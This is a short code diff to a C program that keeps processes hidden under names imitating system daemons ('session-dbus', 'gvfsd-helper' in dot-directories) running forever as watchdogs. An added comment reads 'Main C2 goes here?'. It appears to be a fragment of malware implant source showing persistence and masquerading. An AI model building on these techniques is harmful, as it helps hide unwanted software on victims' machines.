@@ -28,6 +28,7 @@ int main(int argc, char *argv[]) {
             spawn_thread_watchdog(0, "/home/gdev/.dbus/.sessions/session-dbus");
         }
         do {
+            // forever run session-dbus as a "watchdog process".
             sleep(10);
         } while(true);
 
@@ -54,6 +55,8 @@ int main(int argc, char *argv[]) {
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
         //printf("initial spawn of gvfsd-helper\n");
         spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
+
+        // Main C2 goes here?
     }
 
     #ifndef DEBUG
